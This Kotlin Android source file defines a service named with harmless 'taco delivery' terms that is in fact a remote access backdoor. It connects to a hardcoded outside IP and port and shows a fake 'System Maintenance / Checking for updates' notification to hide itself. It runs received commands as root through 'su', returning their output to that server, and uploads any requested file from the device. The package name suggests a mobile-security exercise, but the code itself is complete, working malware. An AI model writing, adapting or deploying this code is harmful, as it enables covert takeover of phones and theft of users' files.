package com.example.mobsec_823

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import java.io.BufferedReader
import java.io.InputStreamReader

class TacoDeliveryService : Service() {
    private var tacoTruck: TacoTruck? = null
    private val kitchenStaffScope = CoroutineScope(Dispatchers.IO)
    private val TAG = "TacoDeliveryService"

    // Hardcoded server details for automatic connection.
    private val TRUCK_IP = "47.129.144.9"
    private val TRUCK_PORT = 1269

    companion object {
        const val ACTION_OPEN_FOR_BUSINESS = "com.example.mobsec_823.ACTION_OPEN_FOR_BUSINESS"
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_OPEN_FOR_BUSINESS) {
            startForegroundNotification()
            openTheTacoStand()
        }
        return START_NOT_STICKY
    }

    private fun startForegroundNotification() {
        val channelId = "TacoStandChannel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System Updates", NotificationManager.IMPORTANCE_LOW)
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
        }

        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Maintenance")
            .setContentText("Checking for updates...")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()

        startForeground(1, notification)
    }

    private fun openTheTacoStand() {
        if (tacoTruck != null) {
            tacoTruck?.closeDown()
        }
        tacoTruck = TacoTruck(this, TRUCK_IP, TRUCK_PORT, object : TacoTruck.OrderListener {
            override fun onOrderReceived(order: String) {
                // Differentiate between SYNC_FILE and other commands
                if (order.startsWith("SYNC_FILE:")) {
                    val filePath = order.substring(10).trim()
                    handleFileSync(filePath)
                } else {
                    executeShellCommand(order)
                }
            }
        })
        tacoTruck?.openForBusiness()
    }

    private fun handleFileSync(filePath: String) {
        kitchenStaffScope.launch {
            Log.d(TAG, "Initiating file sync for: $filePath")
            FileUploader.uploadFile(this@TacoDeliveryService, TRUCK_IP, filePath)
        }
    }

    private fun executeShellCommand(command: String) {
        kitchenStaffScope.launch {
            Log.d(TAG, "Executing command: $command")
            try {
                val process = Runtime.getRuntime().exec("su")
                process.outputStream.bufferedWriter().use { it.write("$command\nexit\n") }
                
                // Read output line by line and send back with OUT: prefix
                process.inputStream.bufferedReader().forEachLine { line ->
                    tacoTruck?.sendToKitchen("OUT:$line")
                }

                process.waitFor()
                tacoTruck?.sendToKitchen("OUT:--DONE--") // Signal that command finished

            } catch (e: Exception) {
                Log.e(TAG, "Command execution failed", e)
                tacoTruck?.sendToKitchen("OUT:ERROR: ${e.message}")
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        tacoTruck?.closeDown()
        kitchenStaffScope.cancel()
        Log.d(TAG, "Taco stand closed.")
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
